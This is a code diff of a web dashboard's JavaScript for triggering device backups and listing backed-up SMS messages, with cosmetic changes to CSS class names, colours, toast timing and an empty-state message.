         device: devId,
@@ -775,7 +823,7 @@ function triggerDeviceBackup(devId) {
         setTimeout(refreshBackupStatus, 3000);
     }).catch(() => {
         $('backupStatusValue').textContent = '❌ Failed';
-        $('backupStatusValue').className = 'value failed';
+        $('backupStatusValue').className = 'status-value failed';
         showToast('❌ Failed to send', 'error');
     });
 }
@@ -810,7 +858,7 @@ function refreshDeviceBackup(devId) {
             let color = 'var(--text-muted)';
             let icon = '📊';
             if (st === 'success') { color = 'var(--green)';
-                icon = '✅'; } else if (st === 'in_progress' || st === 'pending') { color = 'var(--orange)';
+                icon = '✅'; } else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b';
                 icon = '⏳'; } else if (st === 'failed' || st === 'error') { color = 'var(--red)';
                 icon = '❌'; }
             html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;
@@ -849,10 +897,10 @@ function clearBackupStatus() {
 // ============================================================
 // TOAST
 // ============================================================
-function showToast(message, type = 'info', duration = 2500) {
+function showToast(message, type = 'info', duration = 2800) {
     const container = $('toastContainer');
     const toast = document.createElement('div');
-    toast.className = `toast ${type}`;
+    toast.className = `toast-luxury ${type}`;
     toast.textContent = message;
     container.appendChild(toast);
 
@@ -882,7 +930,7 @@ document.addEventListener('DOMContentLoaded', function() {
             loadBackupSmsForDevice(id);
             refreshDeviceBackup(id);
         } else {
-            $('backupSmsList').innerHTML = '<div class="no-data" style="padding:12px;">Select a device</div>';
+            $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
         }
     });
 });
